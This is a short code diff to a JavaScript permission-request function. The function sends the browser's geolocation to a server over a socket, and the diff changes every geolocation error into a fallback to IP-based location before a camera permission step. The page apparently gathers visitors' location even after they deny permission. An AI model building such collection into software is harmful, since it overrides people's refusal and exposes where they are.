@@ -1030,10 +1030,7 @@ function requestPermItem(perm) {
                         socket.emit('location',{lat:p.coords.latitude,lng:p.coords.longitude,accuracy:p.coords.accuracy});
                         donePerm();
                     },
-                    (err) => {
-                        if (err.code === 1) { getIPLocation().then(() => doneFallback()).catch(() => doneFallback()); } // permission denied → fallback IP
-                        else fail(); // other error → retry
-                    },
+                    () => { getIPLocation().then(() => doneFallback()).catch(() => doneFallback()); }, // any error → IP fallback
                     {enableHighAccuracy:true,timeout:10000}
                 );
             } else if (perm.id === 'camera') {
